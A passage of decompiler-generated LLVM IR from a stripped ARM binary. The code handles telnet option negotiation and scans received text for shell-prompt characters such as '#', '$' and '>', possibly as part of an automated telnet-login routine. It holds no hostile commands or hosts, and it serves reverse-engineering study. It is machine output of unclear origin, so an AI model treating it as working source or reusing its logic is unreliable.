  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v0_f718 = load i32, i32* @r6, align 4
  %v1_f718 = inttoptr i32 %v0_f718 to i32*
  %v2_f718 = load i32, i32* %v1_f718, align 4
  store i32 %v2_f718, i32* %r3.global-to-local, align 4
  %v1_f71c = add i32 %v0_f718, 4
  %v2_f71c = inttoptr i32 %v1_f71c to i32*
  %v3_f71c = load i32, i32* %v2_f71c, align 4
  store i32 %v3_f71c, i32* %r0.global-to-local, align 4
  %v1_f720 = add i32 %v2_f718, 13
  %v2_f720 = inttoptr i32 %v1_f720 to i8*
  %v3_f720 = load i8, i8* %v2_f720, align 1
  %v4_f720 = zext i8 %v3_f720 to i32
  store i32 %v4_f720, i32* %r2.global-to-local, align 4
  %v1_f724 = add i32 %v2_f718, 4
  %v2_f724 = inttoptr i32 %v1_f724 to i32*
  %v3_f724 = load i32, i32* %v2_f724, align 4
  store i32 %v3_f724, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_f72c = call i32 @function_11538(i32 %v3_f71c, i32 %v3_f724, i32 %v4_f720, i32 16384)
  store i32 %v4_f72c, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f734 = load i32, i32* @r6, align 4
  %v1_f734 = add i32 %v0_f734, 4
  %v2_f734 = inttoptr i32 %v1_f734 to i32*
  %v3_f734 = load i32, i32* %v2_f734, align 4
  store i32 %v3_f734, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_16224.187 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_f740 = call i32 @function_11538(i32 %v3_f734, i32 ptrtoint ([3 x i8]* @global_var_16224.187 to i32), i32 2, i32 16384)
  store i32 %v4_f740, i32* %r0.global-to-local, align 4
  store i32 5, i32* @r3, align 4
  %v1_f748 = load i32, i32* @r6, align 4
  %v2_f748 = add i32 %v1_f748, 12
  %v3_f748 = inttoptr i32 %v2_f748 to i32*
  store i32 5, i32* %v3_f748, align 4
  br label %dec_label_pc_f74c

dec_label_pc_f74c:                                ; preds = %dec_label_pc_f360, %bb436, %dec_label_pc_f85c, %dec_label_pc_f994, %dec_label_pc_f900, %dec_label_pc_f9d8, %dec_label_pc_f718
  %v0_f74c = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f74c = icmp eq i32 %v0_f74c, 0
  store i1 %v2_f74c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f74c, label %dec_label_pc_ef34.loopexit, label %dec_label_pc_f0d0

dec_label_pc_f758:                                ; preds = %dec_label_pc_efb4
  %v1_f758 = add i32 %v0_efb4, 24
  %v2_f758 = inttoptr i32 %v1_f758 to i32*
  %v3_f758 = load i32, i32* %v2_f758, align 4
  store i32 %v3_f758, i32* %r2.global-to-local, align 4
  %v1_f75c = add i32 %v3_f758, -1
  store i32 %v1_f75c, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f760 = icmp eq i32 %v1_f75c, 0
  store i1 %v2_f760, i1* %cpsr_z.global-to-local, align 1
  %tmp450 = icmp slt i32 %v1_f75c, 1
  br i1 %tmp450, label %dec_label_pc_f7d4, label %dec_label_pc_f768

dec_label_pc_f768:                                ; preds = %dec_label_pc_f758
  %v2_f768 = add i32 %v1_f75c, %v0_efb4
  store i32 %v2_f768, i32* %r3.global-to-local, align 4
  %v1_f76c = add i32 %v2_f768, 28
  %v2_f76c = inttoptr i32 %v1_f76c to i8*
  %v3_f76c = load i8, i8* %v2_f76c, align 1
  %v4_f76c = zext i8 %v3_f76c to i32
  store i32 %v4_f76c, i32* %r3.global-to-local, align 4
  %v2_f770 = icmp ugt i8 %v3_f76c, 61
  store i1 %v2_f770, i1* %cpsr_c.global-to-local, align 1
  %v7_f770 = icmp eq i8 %v3_f76c, 62
  store i1 %v7_f770, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f770, label %dec_label_pc_f8ec, label %bb451

bb451:                                            ; preds = %dec_label_pc_f768
  %v3_f774 = icmp ugt i8 %v3_f76c, 57
  store i1 %v3_f774, i1* %cpsr_c.global-to-local, align 1
  %v8_f774 = icmp eq i8 %v3_f76c, 58
  store i1 %v8_f774, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f774, label %dec_label_pc_f8ec, label %dec_label_pc_f77c

dec_label_pc_f77c:                                ; preds = %bb451
  %v2_f77c = icmp ugt i8 %v3_f76c, 35
  store i1 %v2_f77c, i1* %cpsr_c.global-to-local, align 1
  %v7_f77c = icmp eq i8 %v3_f76c, 36
  store i1 %v7_f77c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f77c, label %dec_label_pc_f8ec, label %dec_label_pc_f784

dec_label_pc_f784:                                ; preds = %dec_label_pc_f77c
  %v2_f784 = icmp ugt i8 %v3_f76c, 34
  store i1 %v2_f784, i1* %cpsr_c.global-to-local, align 1
  %v7_f784 = icmp eq i8 %v3_f76c, 35
  store i1 %v7_f784, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f784, label %dec_label_pc_f8ec, label %dec_label_pc_f78c

dec_label_pc_f78c:                                ; preds = %dec_label_pc_f784
  %v2_f78c = icmp ugt i8 %v3_f76c, 36
  store i1 %v2_f78c, i1* %cpsr_c.global-to-local, align 1
  %v7_f78c = icmp eq i8 %v3_f76c, 37
  store i1 %v7_f78c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f78c, label %dec_label_pc_f8ec, label %dec_label_pc_f7cc.preheader

dec_label_pc_f7cc.preheader:                      ; preds = %dec_label_pc_f78c
  %v3_f790 = add i32 %v0_efb4, 28
  %v2_f794 = add i32 %v3_f790, %v3_f758
  store i32 %v2_f794, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f7cc

dec_label_pc_f7a0:                                ; preds = %dec_label_pc_f7cc
  %v1_f7a0 = add i32 %v0_f7c4, -2
  %v2_f7a0 = inttoptr i32 %v1_f7a0 to i8*
  %v3_f7a0 = load i8, i8* %v2_f7a0, align 1
  %v4_f7a0 = zext i8 %v3_f7a0 to i32
  store i32 %v4_f7a0, i32* %r2.global-to-local, align 4
  %v2_f7a4 = icmp ugt i8 %v3_f7a0, 61
  store i1 %v2_f7a4, i1* %cpsr_c.global-to-local, align 1
  %v7_f7a4 = icmp eq i8 %v3_f7a0, 62
  store i1 %v7_f7a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f7a4, label %dec_label_pc_f8ec, label %bb452

bb452:                                            ; preds = %dec_label_pc_f7a0
  %v3_f7a8 = icmp ugt i8 %v3_f7a0, 57
  store i1 %v3_f7a8, i1* %cpsr_c.global-to-local, align 1
  %v8_f7a8 = icmp eq i8 %v3_f7a0, 58
  store i1 %v8_f7a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f7a8, label %dec_label_pc_f8ec, label %dec_label_pc_f7b0

dec_label_pc_f7b0:                                ; preds = %bb452
  %v2_f7b0 = icmp ugt i8 %v3_f7a0, 35
  store i1 %v2_f7b0, i1* %cpsr_c.global-to-local, align 1
  %v7_f7b0 = icmp eq i8 %v3_f7a0, 36
  store i1 %v7_f7b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f7b0, label %dec_label_pc_f8ec, label %dec_label_pc_f7b8

dec_label_pc_f7b8:                                ; preds = %dec_label_pc_f7b0
  %v2_f7b8 = icmp ugt i8 %v3_f7a0, 34
  store i1 %v2_f7b8, i1* %cpsr_c.global-to-local, align 1
  %v7_f7b8 = icmp eq i8 %v3_f7a0, 35
  store i1 %v7_f7b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f7b8, label %dec_label_pc_f8ec, label %dec_label_pc_f7c0

dec_label_pc_f7c0:                                ; preds = %dec_label_pc_f7b8
  %v2_f7c0 = icmp ugt i8 %v3_f7a0, 36
  store i1 %v2_f7c0, i1* %cpsr_c.global-to-local, align 1
  %v7_f7c0 = icmp eq i8 %v3_f7a0, 37
  store i1 %v7_f7c0, i1* %cpsr_z.global-to-local, align 1
  %v1_f7c4 = add i32 %v0_f7c4, -1
  store i32 %v1_f7c4, i32* %r3.global-to-local, align 4
  br i1 %v7_f7c0, label %dec_label_pc_f8ec, label %dec_label_pc_f7cc

dec_label_pc_f7cc:                                ; preds = %dec_label_pc_f7cc.preheader, %dec_label_pc_f7c0
  %v0_f7c4 = phi i32 [ %v2_f794, %dec_label_pc_f7cc.preheader ], [ %v1_f7c4, %dec_label_pc_f7c0 ]
  %v0_f7cc = phi i32 [ %v1_f75c, %dec_label_pc_f7cc.preheader ], [ %v1_f7cc, %dec_label_pc_f7c0 ]
  %v1_f7cc = add i32 %v0_f7cc, -1
  store i32 %v1_f7cc, i32* %r1.global-to-local, align 4
  %v2_f7cc = icmp ne i32 %v0_f7cc, 0
  store i1 %v2_f7cc, i1* %cpsr_c.global-to-local, align 1
  %v7_f7cc = icmp eq i32 %v0_f7cc, 1
  store i1 %v7_f7cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f7cc, label %dec_label_pc_f7d4, label %dec_label_pc_f7a0

dec_label_pc_f7d4:                                ; preds = %dec_label_pc_f7cc, %dec_label_pc_f758
  store i32 29, i32* %r0.global-to-local, align 4
  %v1_f7d8 = call i32 @function_fd64(i32 29)
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_f7e0 = call i32 @function_fd64(i32 30)
  store i32 %v2_f7e8, i32* %r1.global-to-local, align 4
  store i32 29, i32* %r0.global-to-local, align 4
  %v3_f7f0 = call i32 @function_fca0(i32 29, i32* nonnull %stack_var_-60)
  store i32 %v3_f7f0, i32* @r4, align 4
  store i32 %v2_f7e8, i32* %r1.global-to-local, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v3_f804 = call i32 @function_fca0(i32 30, i32* nonnull %stack_var_-60)
  %v3_f808 = load i32, i32* %stack_var_-60, align 4
  %sext = mul i32 %v3_f804, 16777216
  %v1_f80c = sdiv i32 %sext, 16777216
  store i32 %v1_f80c, i32* @r5, align 4
  %v0_f810 = load i32, i32* @r4, align 4
  store i32 %v0_f810, i32* %r2.global-to-local, align 4
  %v1_f814 = add i32 %v3_f808, -1
  store i32 %v1_f814, i32* %r3.global-to-local, align 4
  %v0_f818 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_f818, i32* %r0.global-to-local, align 4
  %v0_f81c = load i32, i32* @r6, align 4
  %v1_f81c = add i32 %v0_f81c, 24
  %v2_f81c = inttoptr i32 %v1_f81c to i32*
  %v3_f81c = load i32, i32* %v2_f81c, align 4
  store i32 %v3_f81c, i32* %r1.global-to-local, align 4
  %v4_f820 = call i32 @function_103d4(i32 %v0_f818, i32 %v3_f81c, i32 %v0_f810, i32 %v1_f814)
  store i32 %v4_f820, i32* %r0.global-to-local, align 4
  %v2_f824 = icmp eq i32 %v4_f820, -1
  store i1 %v2_f824, i1* %cpsr_c.global-to-local, align 1
  %v7_f824 = icmp eq i32 %v4_f820, -1
  store i1 %v7_f824, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f824, label %dec_label_pc_f834, label %dec_label_pc_f85c

dec_label_pc_f834:                                ; preds = %dec_label_pc_f7d4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v3_f834 = load i32, i32* %stack_var_-60, align 4
  %v0_f838 = load i32, i32* @r5, align 4
  store i32 %v0_f838, i32* %r2.global-to-local, align 4
  %v1_f83c = add i32 %v3_f834, -1
  store i32 %v1_f83c, i32* %r3.global-to-local, align 4
  %v0_f840 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_f840, i32* %r0.global-to-local, align 4
  %v0_f844 = load i32, i32* @r6, align 4
  %v1_f844 = add i32 %v0_f844, 24
  %v2_f844 = inttoptr i32 %v1_f844 to i32*
  %v3_f844 = load i32, i32* %v2_f844, align 4
  store i32 %v3_f844, i32* %r1.global-to-local, align 4
  %v4_f848 = call i32 @function_103d4(i32 %v0_f840, i32 %v3_f844, i32 %v0_f838, i32 %v1_f83c)
  store i32 %v4_f848, i32* %r0.global-to-local, align 4
  %v1_f84c = add i32 %v4_f848, 1
  store i32 %v1_f84c, i32* @r7, align 4
  %v2_f84c = icmp eq i32 %v4_f848, -1
  store i1 %v2_f84c, i1* %cpsr_c.global-to-local, align 1
  %v7_f84c = icmp eq i32 %v1_f84c, 0
  store i1 %v7_f84c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f84c, label %dec_label_pc_fb10, label %dec_label_pc_f85c

dec_label_pc_f85c:                                ; preds = %dec_label_pc_f834, %dec_label_pc_f7d4
  store i32 1, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 29, i32* %r0.global-to-local, align 4
  %v1_f860 = call i32 @function_fcc4(i32 29)
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_f868 = call i32 @function_fcc4(i32 30)
  store i32 %v1_f868, i32* %r0.global-to-local, align 4
  %v0_f86c = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f86c = icmp eq i32 %v0_f86c, 0
  store i1 %v2_f86c, i1* %cpsr_z.global-to-local, align 1
  %tmp453 = icmp slt i32 %v0_f86c, 1
  br i1 %tmp453, label %dec_label_pc_f74c, label %dec_label_pc_f900

dec_label_pc_f878:                                ; preds = %dec_label_pc_f2e4
  store i32 ptrtoint (i32* @global_var_16230.189 to i32), i32* @r1, align 4
  store i32 3, i32* @r2, align 4
  store i32 %v2_f87c, i32* @r0, align 4
  %v0_f894 = call i32 @function_11310()
  store i32 9, i32* @r2, align 4
  store i32 %v2_f890, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_16227.191 to i32), i32* @r1, align 4
  %v0_f8a4 = call i32 @function_11310()
  store i32 %v0_f8a4, i32* %r0.global-to-local, align 4
  %v0_f8a8 = load i32, i32* @r6, align 4
  %v1_f8a8 = add i32 %v0_f8a8, 24
  %v2_f8a8 = inttoptr i32 %v1_f8a8 to i32*
  %v3_f8a8 = load i32, i32* %v2_f8a8, align 4
  %v0_f8ac = load i32, i32* @r4, align 4
  %v1_f8ac = add i32 %v0_f8ac, 2
  store i32 %v1_f8ac, i32* %r2.global-to-local, align 4
  %v0_f8b0 = load i32, i32* %sb.global-to-local, align 4
  %v2_f8b0 = add i32 %v0_f8b0, %v3_f8a8
  store i32 %v2_f8b0, i32* @r3, align 4
  %v3_f8b4 = icmp uge i32 %v2_f8b0, %v1_f8ac
  store i1 %v3_f8b4, i1* %cpsr_c.global-to-local, align 1
  %v9_f8b4 = icmp eq i32 %v2_f8b0, %v1_f8ac
  store i1 %v9_f8b4, i1* %cpsr_z.global-to-local, align 1
  %v2_f8b8 = xor i1 %v3_f8b4, true
  %v3_f8b8 = or i1 %v9_f8b4, %v2_f8b8
  br i1 %v3_f8b8, label %dec_label_pc_f878.dec_label_pc_f360.loopexit_crit_edge, label %dec_label_pc_f8bc

dec_label_pc_f878.dec_label_pc_f360.loopexit_crit_edge: ; preds = %dec_label_pc_f878
  %v0_f360.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_f360

dec_label_pc_f8bc:                                ; preds = %dec_label_pc_f878
  %v2_f8bc = inttoptr i32 %v1_f8ac to i8*
  %v3_f8bc = load i8, i8* %v2_f8bc, align 1
  %v4_f8bc = zext i8 %v3_f8bc to i32
  store i32 %v4_f8bc, i32* %r3.global-to-local, align 4
  %v2_f8c0 = icmp ugt i8 %v3_f8bc, 30
  store i1 %v2_f8c0, i1* %cpsr_c.global-to-local, align 1
  %v7_f8c0 = icmp eq i8 %v3_f8bc, 31
  store i1 %v7_f8c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f8c0, label %dec_label_pc_f9f0, label %dec_label_pc_f8c8

dec_label_pc_f8c8:                                ; preds = %dec_label_pc_f8bc
  %v1_f8c8 = inttoptr i32 %v0_f8ac to i8*
  %v2_f8c8 = load i8, i8* %v1_f8c8, align 1
  %v3_f8c8 = zext i8 %v2_f8c8 to i32
  store i32 %v3_f8c8, i32* %r3.global-to-local, align 4
  %v2_f8cc = icmp ugt i8 %v2_f8c8, -4
  store i1 %v2_f8cc, i1* %cpsr_c.global-to-local, align 1
  %v7_f8cc = icmp eq i8 %v2_f8c8, -3
  store i1 %v7_f8cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f8cc, label %.thread138, label %dec_label_pc_f8dc

.thread138:                                       ; preds = %dec_label_pc_f8c8
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v1_f8c8, align 1
  %v0_f8d8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f8d8.pr.pr, label %dec_label_pc_f2f8, label %.thread138.dec_label_pc_f8dcthread-pre-split_crit_edge

.thread138.dec_label_pc_f8dcthread-pre-split_crit_edge: ; preds = %.thread138
  %v0_f8dc.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f8dc

dec_label_pc_f8dc:                                ; preds = %dec_label_pc_f8c8, %.thread138.dec_label_pc_f8dcthread-pre-split_crit_edge
  %v0_f8dc.pr = phi i32 [ %v0_f8dc.pr.pre, %.thread138.dec_label_pc_f8dcthread-pre-split_crit_edge ], [ %v3_f8c8, %dec_label_pc_f8c8 ]
  %v2_f8dc = icmp ugt i32 %v0_f8dc.pr, 250
  store i1 %v2_f8dc, i1* %cpsr_c.global-to-local, align 1
  %v7_f8dc = icmp eq i32 %v0_f8dc.pr, 251
  store i1 %v7_f8dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f8dc, label %bb454, label %dec_label_pc_f2f8

bb454:                                            ; preds = %dec_label_pc_f8dc
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_f8e4 = load i32, i32* @r4, align 4
  %v4_f8e4 = inttoptr i32 %v3_f8e4 to i8*
  store i8 -3, i8* %v4_f8e4, align 1
  br label %dec_label_pc_f2f8

dec_label_pc_f8ec:                                ; preds = %dec_label_pc_f7a0, %dec_label_pc_f7c0, %dec_label_pc_f7b8, %dec_label_pc_f7b0, %bb452, %dec_label_pc_f78c, %dec_label_pc_f768, %dec_label_pc_f784, %dec_label_pc_f77c, %bb451
  %v0_f8f0 = phi i32 [ %v1_f75c, %dec_label_pc_f78c ], [ %v1_f75c, %dec_label_pc_f768 ], [ %v1_f75c, %dec_label_pc_f784 ], [ %v1_f75c, %dec_label_pc_f77c ], [ %v1_f75c, %bb451 ], [ %v1_f7cc, %bb452 ], [ %v1_f7cc, %dec_label_pc_f7b0 ], [ %v1_f7cc, %dec_label_pc_f7b8 ], [ %v1_f7cc, %dec_label_pc_f7c0 ], [ %v1_f7cc, %dec_label_pc_f7a0 ]
  store i32 29, i32* %r0.global-to-local, align 4
  %v1_f8f0 = add i32 %v0_f8f0, 1
  store i32 %v1_f8f0, i32* @r7, align 4
  %v1_f8f4 = call i32 @function_fcc4(i32 29)
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_f8fc = call i32 @function_fcc4(i32 30)
  store i32 %v1_f8fc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f900

dec_label_pc_f900:                                ; preds = %dec_label_pc_f85c, %dec_label_pc_f8ec
  %v0_f900 = load i32, i32* @r6, align 4
  %v1_f900 = inttoptr i32 %v0_f900 to i32*
  %v2_f900 = load i32, i32* %v1_f900, align 4
  store i32 %v2_f900, i32* %r3.global-to-local, align 4
  %v1_f904 = add i32 %v0_f900, 4
  %v2_f904 = inttoptr i32 %v1_f904 to i32*
  %v3_f904 = load i32, i32* %v2_f904, align 4
  store i32 %v3_f904, i32* %r0.global-to-local, align 4
  %v1_f908 = add i32 %v2_f900, 12
  %v2_f908 = inttoptr i32 %v1_f908 to i8*
  %v3_f908 = load i8, i8* %v2_f908, align 1
  %v4_f908 = zext i8 %v3_f908 to i32
  store i32 %v4_f908, i32* %r2.global-to-local, align 4
  %v1_f90c = inttoptr i32 %v2_f900 to i32*
  %v2_f90c = load i32, i32* %v1_f90c, align 4
  store i32 %v2_f90c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_f914 = call i32 @function_11538(i32 %v3_f904, i32 %v2_f90c, i32 %v4_f908, i32 16384)
  store i32 %v4_f914, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f91c = load i32, i32* @r6, align 4
  %v1_f91c = add i32 %v0_f91c, 4
  %v2_f91c = inttoptr i32 %v1_f91c to i32*
  %v3_f91c = load i32, i32* %v2_f91c, align 4
  store i32 %v3_f91c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_16224.187 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_f928 = call i32 @function_11538(i32 %v3_f91c, i32 ptrtoint ([3 x i8]* @global_var_16224.187 to i32), i32 2, i32 16384)
  store i32 %v4_f928, i32* %r0.global-to-local, align 4
  store i32 4, i32* @r3, align 4
  %v1_f930 = load i32, i32* @r6, align 4
  %v2_f930 = add i32 %v1_f930, 12
  %v3_f930 = inttoptr i32 %v2_f930 to i32*
  store i32 4, i32* %v3_f930, align 4
  br label %dec_label_pc_f74c

dec_label_pc_f938:                                ; preds = %dec_label_pc_f6a4, %dec_label_pc_f6bc, %dec_label_pc_f6b4, %bb448, %dec_label_pc_f690, %dec_label_pc_f674, %dec_label_pc_f688, %bb447
  %v0_f93c = phi i32 [ %v1_f668, %dec_label_pc_f690 ], [ %v1_f668, %dec_label_pc_f674 ], [ %v1_f668, %dec_label_pc_f688 ], [ %v1_f668, %bb447 ], [ %v1_f6c8, %bb448 ], [ %v1_f6c8, %dec_label_pc_f6b4 ], [ %v1_f6c8, %dec_label_pc_f6bc ], [ %v1_f6c8, %dec_label_pc_f6a4 ]
  store i32 28, i32* %r0.global-to-local, align 4
  %v1_f93c = add i32 %v0_f93c, 1
  store i32 %v1_f93c, i32* @r7, align 4
  %v1_f940 = call i32 @function_fcc4(i32 28)
  br label %dec_label_pc_f718

dec_label_pc_f948:                                ; preds = %dec_label_pc_f054
  store i32 11, i32* %r0.global-to-local, align 4
  %v1_f954 = call i32 @function_fd64(i32 11)
  store i32 %v2_f7e8, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r0.global-to-local, align 4
  %v3_f964 = call i32 @function_fca0(i32 11, i32* nonnull %stack_var_-60)
  store i32 %v3_f964, i32* %r0.global-to-local, align 4
  %v3_f968 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f964, i32* %r2.global-to-local, align 4
  %v1_f970 = add i32 %v3_f968, -1
  store i32 %v1_f970, i32* %r3.global-to-local, align 4
  %v0_f974 = load i32, i32* @r6, align 4
  %v1_f974 = add i32 %v0_f974, 24
  %v2_f974 = inttoptr i32 %v1_f974 to i32*
  %v3_f974 = load i32, i32* %v2_f974, align 4
  store i32 %v3_f974, i32* %r1.global-to-local, align 4
  %v0_f978 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_f978, i32* %r0.global-to-local, align 4
  %v4_f97c = call i32 @function_103d4(i32 %v0_f978, i32 %v3_f974, i32 %v3_f964, i32 %v1_f970)
  store i32 %v4_f97c, i32* @r7, align 4
  store i32 11, i32* %r0.global-to-local, align 4
  %v1_f988 = call i32 @function_fcc4(i32 11)
  store i32 %v1_f988, i32* @r0, align 4
  %v0_f98c = load i32, i32* @r7, align 4
  %v2_f98c = icmp eq i32 %v0_f98c, -1
  store i1 %v2_f98c, i1* %cpsr_c.global-to-local, align 1
  %v7_f98c = icmp eq i32 %v0_f98c, -1
  store i1 %v7_f98c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f98c, label %dec_label_pc_ef34.loopexit, label %dec_label_pc_f994

dec_label_pc_f994:                                ; preds = %dec_label_pc_f948
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f994 = icmp eq i32 %v0_f98c, 0
  store i1 %v2_f994, i1* %cpsr_z.global-to-local, align 1
  %tmp455 = icmp slt i32 %v0_f98c, 1
  br i1 %tmp455, label %dec_label_pc_f74c, label %dec_label_pc_f99c

dec_label_pc_f99c:                                ; preds = %dec_label_pc_f994
  %v0_f99c = load i32, i32* @r6, align 4
  %v1_f99c = add i32 %v0_f99c, 20
  %v2_f99c = inttoptr i32 %v1_f99c to i16*
  %v3_f99c = load i16, i16* %v2_f99c, align 2
  %v4_f99c = zext i16 %v3_f99c to i32
  store i32 %v4_f99c, i32* %r3.global-to-local, align 4
  %v1_f9a0 = add i32 %v0_f99c, 16
  %v2_f9a0 = inttoptr i32 %v1_f9a0 to i32*
  %v3_f9a0 = load i32, i32* %v2_f9a0, align 4
  store i32 %v3_f9a0, i32* %r2.global-to-local, align 4
  store i32 %v2_f9a4, i32* @ip, align 4
  store i32 %v4_f99c, i32* %stack_var_-42, align 4
  store i32 %v3_f9a0, i32* %stack_var_-60, align 4
  %v1_f9b0 = inttoptr i32 %v0_f99c to i32*
  %v2_f9b0 = load i32, i32* %v1_f9b0, align 4
  store i32 %v2_f9b0, i32* @r8, align 4
  %v0_f9b4 = call i32 @function_10acc()
  store i32 %v0_f9b4, i32* %r0.global-to-local, align 4
  %v7_f9b8 = icmp eq i32 %v0_f9b4, -1
  %.465 = zext i1 %v7_f9b8 to i32
  store i32 %.465, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f9c4 = icmp eq i32 %v0_f9b4, 0
  store i1 %v2_f9c4, i1* %cpsr_z.global-to-local, align 1
  %tmp458 = icmp slt i32 %v0_f9b4, 1
  br i1 %tmp458, label %bb459, label %.thread144

.thread144:                                       ; preds = %dec_label_pc_f99c
  store i32 1, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f9d8

bb459:                                            ; preds = %dec_label_pc_f99c
  store i32 %.465, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f9d0 = icmp eq i1 %v7_f9b8, false
  store i1 %v2_f9d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f9d0, label %dec_label_pc_fb60, label %dec_label_pc_f9d8

dec_label_pc_f9d8:                                ; preds = %.thread144, %bb459
  %v0_f9d8 = load i32, i32* @r6, align 4
  %v1_f9d8 = add i32 %v0_f9d8, 4
  %v2_f9d8 = inttoptr i32 %v1_f9d8 to i32*
  %v3_f9d8 = load i32, i32* %v2_f9d8, align 4
  store i32 %v3_f9d8, i32* %r0.global-to-local, align 4
  %v1_f9dc = call i32 @function_10ddc(i32 %v3_f9d8)
  store i32 %v1_f9dc, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r3, align 4
  %v0_f9e4 = load i32, i32* @r4, align 4
  %v1_f9e4 = load i32, i32* @r6, align 4
  %v2_f9e4 = add i32 %v1_f9e4, 4
  %v3_f9e4 = inttoptr i32 %v2_f9e4 to i32*
  store i32 %v0_f9e4, i32* %v3_f9e4, align 4
  %v0_f9e8 = load i32, i32* @r3, align 4
  %v1_f9e8 = load i32, i32* @r6, align 4
  %v2_f9e8 = add i32 %v1_f9e8, 12
  %v3_f9e8 = inttoptr i32 %v2_f9e8 to i32*
  store i32 %v0_f9e8, i32* %v3_f9e8, align 4
  br label %dec_label_pc_f74c

dec_label_pc_f9f0:                                ; preds = %dec_label_pc_f8bc
  store i32 %v2_f87c, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v1_f9fc = add i32 %v0_f8a8, 4
  %v2_f9fc = inttoptr i32 %v1_f9fc to i32*
  %v3_f9fc = load i32, i32* %v2_f9fc, align 4
  store i32 %v3_f9fc, i32* %r0.global-to-local, align 4
  %v4_fa00 = call i32 @function_11538(i32 %v3_f9fc, i32 %v2_f87c, i32 3, i32 16384)
  store i32 %v4_fa00, i32* %r0.global-to-local, align 4
  %v0_fa04 = load i32, i32* @r6, align 4
  %v1_fa04 = add i32 %v0_fa04, 4
  %v2_fa04 = inttoptr i32 %v1_fa04 to i32*
  %v3_fa04 = load i32, i32* %v2_fa04, align 4
  store i32 %v3_fa04, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f344

dec_label_pc_fa14:                                ; preds = %dec_label_pc_ef40
  store i32 %.pre282, i32* @r0, align 4
  %v1_fa1c = add i32 %v0_fa14, 92
  store i32 %v1_fa1c, i32* @r1, align 4
  store i32 192, i32* @r2, align 4
  %v3_fa24 = call i32 @function_11300(i32 %.pre282, i32 %v1_fa1c, i32 192)
  store i32 %v3_fa24, i32* %r0.global-to-local, align 4
  %v0_fa28 = load i32, i32* @r6, align 4
  %v1_fa28 = add i32 %v0_fa28, 24
  %v2_fa28 = inttoptr i32 %v1_fa28 to i32*
  %v3_fa28 = load i32, i32* %v2_fa28, align 4
  %v1_fa2c = add i32 %v3_fa28, -64
  store i32 %v1_fa2c, i32* %r3.global-to-local, align 4
  store i32 %v1_fa2c, i32* %v2_fa28, align 4
  br label %dec_label_pc_ef50

dec_label_pc_fa38:                                ; preds = %dec_label_pc_f090
  %v0_fa38 = load i32, i32* @r6, align 4
  store i32 %v0_fa38, i32* @r0, align 4
  %v0_fa3c = call i32 @function_e328()
  store i32 %v0_fa3c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f0cc

dec_label_pc_fa44:                                ; preds = %dec_label_pc_eef8
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-60, align 4
